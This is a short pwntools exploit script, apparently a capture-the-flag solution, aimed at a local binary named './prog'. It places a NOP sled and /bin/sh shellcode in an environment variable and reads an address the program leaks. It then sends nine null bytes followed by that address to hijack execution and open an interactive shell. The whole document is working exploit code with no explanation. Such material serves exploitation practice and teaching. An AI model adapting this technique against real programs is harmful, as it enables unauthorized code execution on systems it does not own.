from pwn import *

context.clear(arch='amd64')

duzo = 0x1ffcd
argz = {'A':asm('nop')*duzo + asm(shellcraft.sh())}

p = process('./prog', env=argz)
p.readuntil(' at')
addr = int(p.readline(), 0) + duzo
payload = '\x00'*9
payload += p64(addr)
p.sendline(payload)
p.interactive()
